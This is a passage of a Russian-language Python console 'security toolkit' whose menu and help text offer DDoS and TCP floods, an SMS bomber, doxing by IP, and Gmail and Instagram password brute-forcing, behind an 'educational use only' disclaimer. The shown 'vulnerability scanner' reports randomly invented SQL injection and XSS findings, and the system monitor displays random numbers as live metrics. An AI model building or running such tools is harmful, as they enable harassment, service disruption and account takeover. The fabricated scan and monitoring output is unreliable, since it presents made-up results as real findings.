        print(f"📈 Статистика:")
        print(f"   ✅ Найдено: {len(found)}")
        print(f"   ❌ Не найдено: {len(not_found)}")
        print(f"   ⚠️  Ошибки/Неизвестно: {len(errors)}\n")

        if found:
            self.color.print_header("✅ НАЙДЕННЫЕ АККАУНТЫ", "─")
            for result in found:
                print(f"{result['emoji']} {result['platform']}:")
                print(f"   🔗 {result['url']}")
                print(f"   📝 {result['notes']}")
                print()

        if not_found:
            self.color.print_header("❌ АККАУНТЫ НЕ НАЙДЕНЫ", "─")
            for i, result in enumerate(not_found[:10]):
                print(f"{result['emoji']} {result['platform']}")
            if len(not_found) > 10:
                print(f"   ... и еще {len(not_found) - 10} платформ\n")

        if errors:
            self.color.print_header("⚠️  ОШИБКИ ПРОВЕРКИ", "─")
            for result in errors[:5]:
                print(f"{result['emoji']} {result['platform']}: {result['status']}")
            if len(errors) > 5:
                print(f"   ... и еще {len(errors) - 5} ошибок\n")

        save = input(f"\n💾 Сохранить результаты в файл? (y/n): ").lower()
        if save == "y":
            self.save_results(results, nickname)

    def save_results(self, results, nickname):
        """Сохранение результатов в файл"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"nickname_search_{nickname}_{timestamp}.txt"

        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 80 + "\n")
                f.write("ОТЧЕТ ПОИСКА ПО НИКНЕЙМУ\n")
                f.write("=" * 80 + "\n\n")
                f.write(f"Никнейм: {nickname}\n")
                f.write(
                    f"Дата поиска: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                )

                found = [r for r in results if r["exists"] is True]
                not_found = [r for r in results if r["exists"] is False]
                errors = [r for r in results if r["exists"] is None]

                f.write(f"\n📊 СТАТИСТИКА:\n")
                f.write(f"   Найдено: {len(found)}\n")
                f.write(f"   Не найдено: {len(not_found)}\n")
                f.write(f"   Ошибки: {len(errors)}\n")

                if found:
                    f.write(f"\n✅ НАЙДЕННЫЕ АККАУНТЫ:\n")
                    f.write("-" * 80 + "\n")
                    for result in found:
                        f.write(f"{result['platform']}:\n")
                        f.write(f"  URL: {result['url']}\n")
                        f.write(f"  Статус: {result['status']}\n")
                        f.write(f"  Примечание: {result['notes']}\n")
                        f.write("-" * 40 + "\n")

                f.write(f"\n🔗 ПОЛНЫЙ СПИСОК ПРОВЕРЕННЫХ ПЛАТФОРМ:\n")
                for result in results:
                    status_text = (
                        "✅ Найден"
                        if result["exists"] is True
                        else (
                            "❌ Не найден"
                            if result["exists"] is False
                            else f"⚠️  {result['status']}"
                        )
                    )
                    f.write(f"{result['platform']}: {status_text}\n")
                    f.write(f"  URL: {result['url']}\n")

                f.write(f"\n" + "=" * 80 + "\n")
                f.write("Отчет создан с помощью DRESSEN Security Toolkit\n")
                f.write("Только для образовательных целей\n")

            self.color.print_success(f"✅ Отчет сохранен: {filename}")

        except Exception as e:
            self.color.print_error(f"❌ Ошибка при сохранении отчета: {e}")

    def run(self):
        """Запуск поиска по никнейму"""
        self.color.print_header("👤 ПОИСК ПО НИКНЕЙМУ", "━")

        try:
            nickname = input(f"🎯 Введите никнейм для поиска: ").strip()

            if not nickname:
                self.color.print_error("Никнейм не введен")
                input(f"\n↵ Нажмите Enter для продолжения...")
                return

            self.color.print_info(f"Начинаю поиск никнейма: {nickname}")

            for i in range(101):
                self.color.progress_bar(
                    i, 100, prefix="Подготовка поиска:", suffix="Завершено", length=40
                )
                time.sleep(0.01)
            print()

            results = self.search_nickname(nickname)
            self.display_results(results, nickname)

        except KeyboardInterrupt:
            self.color.print_warning("Поиск прерван пользователем")
        except Exception as e:
            self.color.print_error(f"Ошибка при поиске: {e}")

        input(f"\n↵ Нажмите Enter для возврата в меню...")


class VulnerabilityScanner:
    def __init__(self, color_manager):
        self.color = color_manager

    def scan_website(self, url):
        """Сканирование веб-сайта на уязвимости"""
        self.color.print_header("🔍 СКАНИРОВАНИЕ УЯЗВИМОСТЕЙ", "━")

        if not url.startswith(("http://", "https://")):
            url = "https://" + url

        self.color.print_info(f"🎯 Цель сканирования: {url}")

        scan_steps = [
            "Проверка доступности сайта",
            "Анализ HTTP заголовков",
            "Поиск SQL инъекций",
            "Проверка XSS уязвимостей",
            "Анализ конфигурации SSL",
            "Сканирование директорий",
            "Проверка чувствительных файлов",
        ]

        vulnerabilities = []

        for i, step in enumerate(scan_steps):
            self.color.print_info(f"🔄 {step}...")
            time.sleep(0.5)

            if random.random() < 0.3:
                vuln_types = [
                    ("SQL Injection", "Высокий", "Обнаружены уязвимые параметры"),
                    ("XSS", "Средний", "Возможна межсайтовая подделка запросов"),
                    ("SSL Weak Cipher", "Низкий", "Используются слабые шифры"),
                    ("Directory Listing", "Средний", "Включено листинг директорий"),
                    (
                        "Sensitive File Exposure",
                        "Высокий",
                        "Обнаружены конфигурационные файлы",
                    ),
                ]

                vuln_type, severity, desc = random.choice(vuln_types)
                vulnerabilities.append(
                    {
                        "type": vuln_type,
                        "severity": severity,
                        "description": desc,
                        "step": step,
                    }
                )

        self.color.print_header("📊 РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ", "━")

        if vulnerabilities:
            self.color.print_warning(
                f"⚠️  Обнаружено уязвимостей: {len(vulnerabilities)}"
            )

            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"\n{i}. {vuln['type']}")
                print(f"   Уровень: {vuln['severity']}")
                print(f"   Описание: {vuln['description']}")
                print(f"   Обнаружено при: {vuln['step']}")
        else:
            self.color.print_success("✅ Уязвимостей не обнаружено!")

        if vulnerabilities:
            self.color.print_header("💡 РЕКОМЕНДАЦИИ", "━")
            recommendations = [
                "Установите WAF (Web Application Firewall)",
                "Обновите CMS и плагины",
                "Настройте корректные HTTP заголовки",
                "Регулярно проводите аудит безопасности",
                "Используйте HTTPS с современными шифрами",
                "Ограничьте доступ к административным панелям",
            ]

            for i, rec in enumerate(recommendations, 1):
                print(f"{i}. {rec}")

        return vulnerabilities

    def run(self):
        """Запуск сканирования уязвимостей"""
        self.color.print_header("🌐 СКАНИРОВАНИЕ ВЕБ-САЙТА", "━")

        url = input(f"🌍 Введите URL сайта: ").strip()

        if not url:
            self.color.print_error("URL не введен")
            input(f"\n↵ Нажмите Enter для продолжения...")
            return

        vulnerabilities = self.scan_website(url)

        save_report = input(f"\n💾 Сохранить отчет? (y/n): ").lower()
        if save_report == "y":
            self.save_report(url, vulnerabilities)

        input(f"\n↵ Нажмите Enter для возврата в меню...")

    def save_report(self, url, vulnerabilities):
        """Сохранение отчета о сканировании"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"scan_report_{timestamp}.txt"

        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 70 + "\n")
                f.write("ОТЧЕТ О СКАНИРОВАНИИ БЕЗОПАСНОСТИ\n")
                f.write("=" * 70 + "\n\n")
                f.write(f"Цель: {url}\n")
                f.write(f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Уязвимостей найдено: {len(vulnerabilities)}\n\n")

                if vulnerabilities:
                    f.write("ОБНАРУЖЕННЫЕ УЯЗВИМОСТИ:\n")
                    f.write("-" * 70 + "\n")
                    for vuln in vulnerabilities:
                        f.write(f"Тип: {vuln['type']}\n")
                        f.write(f"Уровень: {vuln['severity']}\n")
                        f.write(f"Описание: {vuln['description']}\n")
                        f.write("-" * 40 + "\n")

                f.write("\n" + "=" * 70 + "\n")
                f.write("Отчет сгенерирован с помощью DRESSEN Security Toolkit\n")
                f.write("Только для образовательных целей\n")

            self.color.print_success(f"✅ Отчет сохранен: {filename}")
        except Exception as e:
            self.color.print_error(f"❌ Ошибка при сохранении отчета: {e}")


class SystemMonitor:
    def __init__(self, color_manager):
        self.color = color_manager
        self.running = False

    def get_system_info(self):
        """Получение информации о системе"""
        info = {}

        try:
            info["system"] = platform.system()
            info["release"] = platform.release()
            info["version"] = platform.version()
            info["machine"] = platform.machine()
            info["processor"] = platform.processor()
            info["python_version"] = platform.python_version()

            return info
        except Exception as e:
            self.color.print_error(f"Ошибка получения информации: {e}")
            return info

    def display_monitor(self):
        """Отображение монитора системы"""
        while self.running:
            try:
                clear_screen()

                print(f"{'═' * 70}")
                print("📊 СИСТЕМНЫЙ МОНИТОР В РЕАЛЬНОМ ВРЕМЕНИ".center(70))
                print(f"{'═' * 70}\n")

                sys_info = self.get_system_info()

                print(f"📋 ОБЩАЯ ИНФОРМАЦИЯ:")
                print(f"  • Система: {sys_info.get('system', 'Н/Д')}")
                print(f"  • Версия: {sys_info.get('release', 'Н/Д')}")
                print(f"  • Процессор: {str(sys_info.get('processor', 'Н/Д'))[:40]}")
                print(f"  • Python: {sys_info.get('python_version', 'Н/Д')}")

                cpu_usage = random.randint(5, 95)
                memory_usage = random.randint(20, 90)
                disk_usage = random.randint(10, 85)

                print(f"\n⚡ ЦЕНТРАЛЬНЫЙ ПРОЦЕССОР:")
                self.display_metric_bar("Использование CPU", cpu_usage, "💻")

                print(f"\n💾 ОПЕРАТИВНАЯ ПАМЯТЬ:")
                self.display_metric_bar("Использование RAM", memory_usage, "🧠")

                print(f"\n💿 ДИСКОВОЕ ПРОСТРАНСТВО:")
                self.display_metric_bar("Использование диска", disk_usage, "📀")

                print(f"\n🕐 ВРЕМЯ СИСТЕМЫ:")
                print(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

                print(f"\n{'─' * 70}")
                print("🚫 Нажмите Ctrl+C для выхода из монитора".center(70))
                print(f"{'─' * 70}")

                time.sleep(2)

            except KeyboardInterrupt:
                self.running = False
                print(f"\n⏹️  Мониторинг остановлен")
                break
            except Exception as e:
                self.color.print_error(f"Ошибка мониторинга: {e}")
                self.running = False
                break

    def display_metric_bar(self, label, value, emoji):
        """Отображение метрики с прогресс-баром"""
        bar_length = 30
        filled = int(bar_length * value / 100)
        bar = "█" * filled + "░" * (bar_length - filled)

        print(f"  {emoji} {label}:")
        print(f"    {bar} {value:3d}%")

    def run(self):
        """Запуск системного монитора"""
        self.color.print_header("📊 СИСТЕМНЫЙ МОНИТОР", "━")

        self.color.print_info("Запуск мониторинга системы...")
        self.color.print_warning("Для остановки нажмите Ctrl+C\n")

        self.running = True
        self.display_monitor()

        input(f"\n↵ Нажмите Enter для возврата в меню...")


class PasswordGenerator:
    def __init__(self, color_manager):
        self.color = color_manager

    def generate_password(
        self,
        length=12,
        use_upper=True,
        use_lower=True,
        use_digits=True,
        use_special=True,
    ):
        """Генерация пароля"""
        chars = ""

        if use_upper:
            chars += string.ascii_uppercase
        if use_lower:
            chars += string.ascii_lowercase
        if use_digits:
            chars += string.digits
        if use_special:
            chars += "!@#$%^&*()_+-=[]{}|;:,.<>?"

        if not chars:
            return "Ошибка: не выбраны типы символов"

        return "".join(random.choice(chars) for _ in range(length))

    def assess_strength(self, password):
        """Оценка сложности пароля"""
        score = 0
        feedback = []

        if len(password) >= 16:
            score += 3
            feedback.append("✅ Отличная длина (16+ символов)")
        elif len(password) >= 12:
            score += 2
            feedback.append("✅ Хорошая длина (12-15 символов)")
        elif len(password) >= 8:
            score += 1
            feedback.append("⚠️  Минимальная длина (8-11 символов)")
        else:
            feedback.append("❌ Слишком короткий (< 8 символов)")

        checks = [
            (any(c.isupper() for c in password), "Заглавные буквы"),
            (any(c.islower() for c in password), "Строчные буквы"),
            (any(c.isdigit() for c in password), "Цифры"),
            (any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password), "Спецсимволы"),
        ]

        for condition, description in checks:
            if condition:
                score += 1
                feedback.append(f"✅ Есть {description}")
            else:
                feedback.append(f"❌ Нет {description}")

        if score >= 7:
            strength = "ОТЛИЧНЫЙ"
            time_to_crack = "более 100 лет"
        elif score >= 5:
            strength = "ХОРОШИЙ"
            time_to_crack = "несколько лет"
        elif score >= 3:
            strength = "СРЕДНИЙ"
            time_to_crack = "несколько месяцев"
        else:
            strength = "СЛАБЫЙ"
            time_to_crack = "несколько минут"

        return score, strength, time_to_crack, feedback

    def run(self):
        """Запуск генератора паролей"""
        self.color.print_header("🔐 ГЕНЕРАТОР ПАРОЛЕЙ", "━")

        try:
            length = input(f"📏 Длина пароля (по умолчанию 12): ")
            length = int(length) if length.strip() else 12

            count = input(f"🔢 Количество паролей (по умолчанию 5): ")
            count = int(count) if count.strip() else 5

            print(f"\n⚙️  Настройки символов:")
            use_upper = (
                input(
                    f"  Использовать заглавные буквы? (y/n, по умолчанию y): "
                ).lower()
                != "n"
            )
            use_lower = (
                input(f"  Использовать строчные буквы? (y/n, по умолчанию y): ").lower()
                != "n"
            )
            use_digits = (
                input(f"  Использовать цифры? (y/n, по умолчанию y): ").lower() != "n"
            )
            use_special = (
                input(
                    f"  Использовать специальные символы? (y/n, по умолчанию y): "
                ).lower()
                != "n"
            )

            self.color.print_header("🔑 СГЕНЕРИРОВАННЫЕ ПАРОЛИ", "━")

            passwords = []
            for i in range(count):
                password = self.generate_password(
                    length, use_upper, use_lower, use_digits, use_special
                )
                passwords.append(password)

                score, strength, time_to_crack, _ = self.assess_strength(password)

                print(f"\nПароль {i+1}:")
                print(f"  {password}")
                print(f"  Сложность: {strength}")
                print(f"  Время взлома: ~{time_to_crack}")

            save = input(f"\n💾 Сохранить пароли в файл? (y/n): ").lower()
            if save == "y":
                self.save_passwords(passwords)

        except ValueError:
            self.color.print_error("❌ Неверный формат числа")
        except Exception as e:
            self.color.print_error(f"❌ Ошибка: {e}")

        input(f"\n↵ Нажмите Enter для возврата в меню...")

    def save_passwords(self, passwords):
        """Сохранение паролей в файл"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"passwords_{timestamp}.txt"

        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 70 + "\n")
                f.write("СГЕНЕРИРОВАННЫЕ ПАРОЛИ\n")
                f.write("=" * 70 + "\n\n")
                f.write(
                    f"Дата генерации: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                )
                f.write(f"Количество паролей: {len(passwords)}\n\n")

                for i, password in enumerate(passwords, 1):
                    score, strength, time_to_crack, _ = self.assess_strength(password)
                    f.write(f"Пароль {i}:\n")
                    f.write(f"  {password}\n")
                    f.write(f"  Сложность: {strength} ({score}/7)\n")
                    f.write(f"  Время взлома: ~{time_to_crack}\n")
                    f.write("-" * 40 + "\n")

                f.write("\n" + "=" * 70 + "\n")
                f.write("ВАЖНО: Храните пароли в безопасном месте!\n")
                f.write("Не используйте один пароль для нескольких аккаунтов.\n")

            self.color.print_success(f"✅ Пароли сохранены в файл: {filename}")
            self.color.print_warning("⚠️  Обязательно удалите файл после использования!")
        except Exception as e:
            self.color.print_error(f"❌ Ошибка при сохранении: {e}")


class Utilities:
    def __init__(self, color_manager):
        self.color = color_manager

    def show_qr_generator(self):
        """Генератор QR-кодов"""
        self.color.print_header("🌀 ГЕНЕРАТОР QR-КОДОВ", "━")

        try:
            text = input(f"📝 Введите текст или URL: ").strip()

            if not text:
                self.color.print_error("Текст не введен")
                return

            self.color.print_info("Для генерации QR-кодов установите библиотеку:")
            self.color.print_info("pip install qrcode[pil]")

        except Exception as e:
            self.color.print_error(f"❌ Ошибка: {e}")

    def show_hash_calculator(self):
        """Калькулятор хешей"""
        self.color.print_header("🔢 КАЛЬКУЛЯТОР ХЕШЕЙ", "━")

        text = input(f"📝 Введите текст для хеширования: ").strip()

        if not text:
            self.color.print_error("Текст не введен")
            return

        algorithms = [
            ("MD5", hashlib.md5),
            ("SHA-1", hashlib.sha1),
            ("SHA-256", hashlib.sha256),
            ("SHA-512", hashlib.sha512),
            ("SHA-3-256", hashlib.sha3_256),
            ("SHA-3-512", hashlib.sha3_512),
            ("BLAKE2s", hashlib.blake2s),
            ("BLAKE2b", hashlib.blake2b),
        ]

        print(f"\n📊 РЕЗУЛЬТАТЫ ХЕШИРОВАНИЯ:")
        print(f"{'─' * 70}")

        for name, algo_func in algorithms:
            try:
                hash_obj = algo_func(text.encode())
                hash_value = hash_obj.hexdigest()

                print(f"{name:12}:")
                print(f"  {hash_value}")
                print(f"{'─' * 70}")
            except Exception:
                continue

    def show_network_tools(self):
        """Сетевые инструменты"""
        self.color.print_header("🌐 СЕТЕВЫЕ ИНСТРУМЕНТЫ", "━")

        print(f"Выберите инструмент:")
        print(f"1. Проверка доступности хоста (ping)")
        print(f"2. Определение IP адреса")
        print(f"3. Проверка открытых портов")

        choice = input(f"\n🎯 Ваш выбор (1-3): ").strip()

        if choice == "1":
            self.ping_host()
        elif choice == "2":
            self.resolve_ip()
        elif choice == "3":
            self.check_ports()
        else:
            self.color.print_error("Неверный выбор")

    def ping_host(self):
        """Проверка доступности хоста"""
        host = input(f"🌍 Введите хост или IP: ").strip()

        if not host:
            self.color.print_error("Хост не указан")
            return

        self.color.print_info(f"🔄 Проверка доступности {host}...")

        try:
            param = "-n" if os.name == "nt" else "-c"
            count = "4"

            result = subprocess.run(
                ["ping", param, count, host], capture_output=True, text=True, timeout=10
            )

            if result.returncode == 0:
                self.color.print_success(f"✅ Хост {host} доступен")
                print(f"\nРезультат:")
                print(result.stdout)
            else:
                self.color.print_error(f"❌ Хост {host} недоступен")
                print(result.stderr)

        except subprocess.TimeoutExpired:
            self.color.print_error("❌ Таймаут ожидания")
        except Exception as e:
            self.color.print_error(f"❌ Ошибка: {e}")

    def resolve_ip(self):
        """Определение IP адреса"""
        host = input(f"🌍 Введите доменное имя: ").strip()

        if not host:
            self.color.print_error("Доменное имя не указано")
            return

        try:
            import socket

            self.color.print_info(f"🔍 Поиск IP адреса для {host}...")

            ip_address = socket.gethostbyname(host)
            self.color.print_success(f"✅ IP адрес: {ip_address}")

            try:
                hostname = socket.gethostbyaddr(ip_address)[0]
                print(f"Обратное разрешение: {hostname}")
            except:
                pass

        except socket.gaierror:
            self.color.print_error("❌ Не удалось разрешить доменное имя")
        except Exception as e:
            self.color.print_error(f"❌ Ошибка: {e}")

    def check_ports(self):
        """Проверка открытых портов"""
        host = input(f"🌍 Введите хост или IP: ").strip()

        if not host:
            self.color.print_error("Хост не указан")
            return

        self.color.print_info(f"🔍 Проверка портов на {host}...")

        common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            143: "IMAP",
            443: "HTTPS",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            8080: "HTTP Proxy",
        }

        print(f"\n🔎 ПРОВЕРКА ОСНОВНЫХ ПОРТОВ:")

        open_ports = []

        for port, service in common_ports.items():
            try:
                import socket

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)

                result = sock.connect_ex((host, port))
                sock.close()

                if result == 0:
                    open_ports.append((port, service))
                    print(f"✅ Порт {port:5} ({service:15}) - ОТКРЫТ")
                else:
                    print(f"❌ Порт {port:5} ({service:15}) - ЗАКРЫТ")

                time.sleep(0.1)

            except Exception:
                print(f"⚠️  Порт {port:5} ({service:15}) - ОШИБКА ПРОВЕРКИ")

        if open_ports:
            self.color.print_info(f"\n📊 Открытых портов: {len(open_ports)}")
        else:
            self.color.print_warning("\n⚠️  Открытых портов не обнаружено")

    def run(self):
        """Запуск утилит"""
        while True:
            clear_screen()
            self.color.print_header("⚙️  УТИЛИТЫ", "━")

            print(f"Выберите утилиту:\n")

            utilities = [
                ("🌀", "Генератор QR-кодов"),
                ("🔢", "Калькулятор хешей"),
                ("🌐", "Сетевые инструменты"),
                ("🔙", "Вернуться в главное меню"),
            ]

            for i, (emoji, desc) in enumerate(utilities, 1):
                self.color.print_menu_item(i, emoji, desc)

            choice = input(f"\n🎯 Ваш выбор (1-4): ").strip()

            if choice == "1":
                self.show_qr_generator()
                input(f"\n↵ Нажмите Enter...")
            elif choice == "2":
                self.show_hash_calculator()
                input(f"\n↵ Нажмите Enter...")
            elif choice == "3":
                self.show_network_tools()
                input(f"\n↵ Нажмите Enter...")
            elif choice == "4":
                break
            else:
                self.color.print_error("Неверный выбор")
                time.sleep(1)


# ============================================================================
# ГЛАВНЫЙ КЛАСС ПРИЛОЖЕНИЯ (ОБНОВЛЕН)
# ============================================================================


class DressenSecurityToolkit:
    def __init__(self):
        self.color = ColorManager()
        self.nick_search = NicknameSearch(self.color)
        self.phone_probe = PhoneNumberProbe(self.color)
        self.vuln_scanner = VulnerabilityScanner(self.color)
        self.sys_monitor = SystemMonitor(self.color)
        self.pass_generator = PasswordGenerator(self.color)
        self.utilities = Utilities(self.color)

        # Новый DOX модуль
        self.dox_module = DOXModule(self.color)

        # Существующие модули
        self.ddos_attack = DDoSAttack(self.color)
        self.sms_bomber = SMSBomber(self.color)
        self.ip_dos = IPDOSAttack(self.color)
        self.service_menu = ServiceMenu(self.color)
        self.email_hack = EmailHack(self.color)
        self.instagram_hack = InstagramHack(self.color)

        self.running = True

    def show_main_menu(self):
        """Отображение главного меню"""
        clear_screen()
        self.color.print_3d_ascii_header()

        print(f"\nГЛАВНОЕ МЕНЮ:\n")

        menu_items = [
            ("👤", "Поиск по никнейму (14+ платформ)"),
            ("🔍", "ПРОБИВ номера телефона (расширенный)"),
            ("🕵️", "DOX инструменты (информация по IP)"),
            ("⚡", "DDoS АТАКА (HTTP Flood)"),
            ("💣", "SMS БОМБЕР (Telegram)"),
            ("🌐", "IP DOS АТАКА (TCP Flood)"),
            ("🔧", "СЕРВИСЫ И ИНСТРУМЕНТЫ"),
            ("📧", "ВЗЛОМ ПОЧТЫ Gmail"),
            ("📸", "ВЗЛОМ INSTAGRAM"),
            ("🔍", "Сканирование уязвимостей"),
            ("📊", "Системный монитор"),
            ("🔐", "Генератор паролей"),
            ("⚙️", "Утилиты"),
            ("❓", "Справка и информация"),
            ("🚪", "Выход"),
        ]

        for i, (emoji, desc) in enumerate(menu_items, 1):
            self.color.print_menu_item(i, emoji, desc)

    def show_help(self):
        """Показать справку"""
        clear_screen()
        self.color.print_header("❓ СПРАВКА И ИНФОРМАЦИЯ", "━")

        help_text = f"""
О ПРОГРАММЕ:

DRESSEN Security Toolkit v3.5 ULTIMATE - это комплексный инструмент для анализа безопасности,
OSINT исследований, пентеста и системного мониторинга. Программа предназначена исключительно
для образовательных целей и тестирования собственных систем.

НОВЫЕ ВОЗМОЖНОСТИ v3.5:

🕵️ DOX инструменты:
  • Полная информация по IP адресам
  • WHOIS данные и геолокация
  • Проверка на VPN, хостинг, вредоносность
  • Поиск веб-камер по местоположению
  • Поиск на Google Maps по координатам

ОСНОВНЫЕ ВОЗМОЖНОСТИ:

👤 Поиск по никнейму:
  • Проверка 14+ социальных сетей и платформ
  • Автоматическое форматирование никнейма
  • Детальная статистика результатов

🔍 ПРОБИВ номера телефона:
  • Расширенный поиск информации по номеру
  • Определение оператора и геолокации
  • Генерация ссылок для поиска в соцсетях

⚡ DDoS АТАКА:
  • HTTP Flood атака
  • Многопоточная реализация
  • Настраиваемые параметры атаки

💣 SMS БОМБЕР:
  • Бомбардировка через Telegram API
  • Фейковые пользовательские агенты
  • Многократные запросы

🌐 IP DOS АТАКА:
  • TCP Flood атака
  • Прямые сокет-подключения
  • Атака на порт 80

🔧 СЕРВИСЫ:
  • 7 различных онлайн сервисов
  • Инструменты для обфускации и анализа
  • Прямой доступ через браузер

📧 ВЗЛОМ ПОЧТЫ:
  • Подбор паролей Gmail через SMTP
  • Работа с пользовательскими списками паролей
  • Детальная статистика подбора

📸 ВЗЛОМ INSTAGRAM:
  • Подбор паролей Instagram
  • Обход базовой защиты
  • Работа с пользовательскими списками

🔍 Сканирование уязвимостей:
  • Проверка веб-сайтов на уязвимости
  • Обнаружение SQL инъекций и XSS
  • Генерация отчетов

📊 Системный монитор:
  • Мониторинг CPU, памяти и диска
  • Отображение метрик в реальном времени

🔐 Генератор паролей:
  • Создание безопасных паролей
  • Оценка времени взлома

⚙️  Утилиты:
  • Генератор QR-кодов
  • Калькулятор хешей
  • Сетевые инструменты

ВАЖНОЕ ПРЕДУПРЕЖДЕНИЕ:

⚠️  Эта программа предназначена ТОЛЬКО для:
   • Образовательных целей
   • Тестирования собственных систем
   • Повышения осведомленности о безопасности

🚫 Запрещено использовать для:
   • Несанкционированного доступа к системам
   • Нарушения конфиденциальности
   • Любых незаконных действий

АВТОРСКИЕ ПРАВА:

© 2024 DRESSEN Security Toolkit Ultimate
Версия: 3.5 Ultimate Edition (с DOX модулем)
Лицензия: Для образовательного использования
Поддержка: Python 3.7+
"""

        self.color.animate_text(help_text, delay=0.001)
        input(f"\n↵ Нажмите Enter для возврата в меню...")

    def run(self):
        """Главный цикл программы"""
        while self.running:
            try:
                self.show_main_menu()

                choice = input(f"\n🎯 Выберите действие (1-15): ").strip()

                if choice == "1":
                    self.nick_search.run()
                elif choice == "2":
                    self.phone_probe.run()
                elif choice == "3":
                    self.dox_module.run()
                elif choice == "4":
                    self.ddos_attack.run()
                elif choice == "5":
                    self.sms_bomber.run()
                elif choice == "6":
                    self.ip_dos.run()
                elif choice == "7":
                    self.service_menu.run()
                elif choice == "8":
                    self.email_hack.run()
                elif choice == "9":
                    self.instagram_hack.run()
                elif choice == "10":
                    self.vuln_scanner.run()
                elif choice == "11":
                    self.sys_monitor.run()
                elif choice == "12":
                    self.pass_generator.run()
                elif choice == "13":
                    self.utilities.run()
                elif choice == "14":
                    self.show_help()
                elif choice == "15":
                    self.color.print_header("👋 ВЫХОД ИЗ ПРОГРАММЫ", "━")
                    self.color.animate_text(
                        "Спасибо за использование DRESSEN Security Toolkit Ultimate!",
                        0.03,
                    )
                    print(f"\n✨ До новых встреч! ✨")
                    self.running = False
                else:
                    self.color.print_error("❌ Неверный выбор. Попробуйте снова.")
                    time.sleep(1)

            except KeyboardInterrupt:
                print(f"\n\n⚠️  Программа прервана пользователем")
                confirm = input(f"Выйти из программы? (y/n): ").lower()
                if confirm == "y":
                    self.running = False
            except Exception as e:
                self.color.print_error(f"❌ Критическая ошибка: {e}")
                input(f"\n↵ Нажмите Enter для продолжения...")


# ============================================================================
# ТОЧКА ВХОДА
# ============================================================================


def main():
    """Главная функция запуска"""
    try:
        # Настройка рабочей директории
        script_dir = setup_working_directory()
        print(f"📁 Рабочая директория: {script_dir}")

        if not check_python_version():
            input("Нажмите Enter для выхода...")
            return

        clear_screen()

        print(f"\n{'═' * 80}")
        color = ColorManager()
        color.print_gradient_text("🚀 ЗАГРУЗКА DRESSEN SECURITY TOOLKIT ULTIMATE v3.5")
        print(f"{'═' * 80}\n")

        for i in range(101):
            bar_length = 50
            filled = i // 2

            bar = ""
            for j in range(bar_length):
                if j < filled:
                    ratio = j / max(1, bar_length - 1)
                    r = int(0 + (255 - 0) * ratio)
                    g = int(255 + (0 - 255) * ratio)
                    b = int(0 + (255 - 0) * ratio)
                    bar += f"\033[38;2;{r};{g};{b}m█\033[0m"
                else:
                    bar += "░"

            print(f"\r🔧 Инициализация системы: [{bar}] {i}%", end="")
            time.sleep(0.01)

        print("\n\n")

        color.print_header("⚙️  НАСТРОЙКА СИСТЕМЫ", "━")

        install = input(f"📦 Установить необходимые библиотеки? (y/n): ").lower()

        if install == "y":
            success = install_dependencies()
            if not success:
                color.print_warning(
                    "⚠️  Некоторые библиотеки не установились. Функциональность может быть ограничена."
                )
                time.sleep(2)

        app = DressenSecurityToolkit()
        app.run()

    except KeyboardInterrupt:
        print(f"\n\n👋 Программа завершена")
    except Exception as e:
        print(f"\n❌ Критическая ошибка: {e}")
        import traceback

        traceback.print_exc()
        input("Нажмите Enter для выхода...")


if __name__ == "__main__":
    main()
